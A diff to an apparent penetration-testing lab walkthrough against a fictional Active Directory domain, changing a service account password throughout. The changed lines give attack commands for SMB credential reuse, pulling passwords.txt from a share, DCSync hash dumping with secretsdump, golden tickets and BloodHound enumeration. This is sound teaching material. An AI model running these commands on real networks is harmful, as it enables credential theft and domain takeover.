@@ -256,7 +256,7 @@ sqlmap -u "http://172.16.0.100/employees/?employee_id=1" -p employee_id -D wordp
 |-------------|-----------|--------------|--------------|
 | EMP001 | John Smith | jsmith | Summer2024 |
 | EMP002 | Mary Williams | mwilliams | Welcome123 |
-| EMP003 | Backup Service | svc_backup | Backup2024! |
+| EMP003 | Backup Service | svc_backup | Backup2024 |
 
 **Why this matters:**
 - Credentials are stored in plaintext (bad practice)
@@ -281,7 +281,7 @@ Let's see if there's a file server accessible that uses these same credentials. 
 
 ```bash
 # Connect to the file server with impacket-smbclient
-impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
+impacket-smbclient 'svc_backup:Backup2024@172.16.2.10'
 ```
 
 Once connected, list available shares:
@@ -293,7 +293,7 @@ Once connected, list available shares:
 
 ```bash
 # List shares with standard smbclient
-smbclient -L //172.16.2.10 -U 'svc_backup%Backup2024!'
+smbclient -L //172.16.2.10 -U 'svc_backup%Backup2024'
 ```
 
 **What you're doing:** Testing if the `svc_backup` credentials from the WordPress database also work on the file server (credential reuse attack).
@@ -309,7 +309,7 @@ smbclient -L //172.16.2.10 -U 'svc_backup%Backup2024!'
 **Method 1: Using Impacket**
 
 ```bash
-impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
+impacket-smbclient 'svc_backup:Backup2024@172.16.2.10'
 ```
 
 Once connected, explore the contents:
@@ -323,10 +323,10 @@ Once connected, explore the contents:
 
 ```bash
 # List files in the sensitive share
-smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024!' -c 'ls'
+smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024' -c 'ls'
 
 # Read passwords.txt directly to stdout
-smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024!' -c 'get passwords.txt -'
+smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024' -c 'get passwords.txt -'
 ```
 
 **Command Reference:**
@@ -342,10 +342,10 @@ smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024!' -c 'get passwords.
 **One-liner alternatives:**
 ```bash
 # Impacket
-echo -e 'use sensitive\ncat passwords.txt\nexit' | impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
+echo -e 'use sensitive\ncat passwords.txt\nexit' | impacket-smbclient 'svc_backup:Backup2024@172.16.2.10'
 
 # Standard smbclient
-smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024!' -c 'get passwords.txt -'
+smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024' -c 'get passwords.txt -'
 ```
 
 ### 3.4 Critical Discovery
@@ -436,7 +436,7 @@ Remember the `svc_backup` account? This service account has been misconfigured w
 
 ```bash
 # Use secretsdump.py to perform DCSync
-impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.12'
+impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024@172.16.2.12'
 ```
 
 **Note:** Samba 4 (which this lab uses) has limited DCSync support. If secretsdump fails with `rpc_s_access_denied`, you can still use the Domain Admin credentials discovered in `passwords.txt` to compromise the domain.
@@ -558,7 +558,7 @@ Here's the complete attack chain you executed:
            └── Extracted plaintext VPN credentials:
                - jsmith / Summer2024
                - mwilliams / Welcome123
-               - svc_backup / Backup2024!
+               - svc_backup / Backup2024
 
 3. LATERAL MOVEMENT
    └── Credential reuse on file server (172.16.2.10)
@@ -651,7 +651,7 @@ impacket-ticketer -domain acmewidgets.local -domain-sid <SID> -krbtgt <HASH> Adm
 
 Run BloodHound to visualize the attack paths:
 ```bash
-bloodhound-python -u svc_backup -p 'Backup2024!' -d acmewidgets.local -ns 172.16.2.12
+bloodhound-python -u svc_backup -p 'Backup2024' -d acmewidgets.local -ns 172.16.2.12
 ```
 
 ---
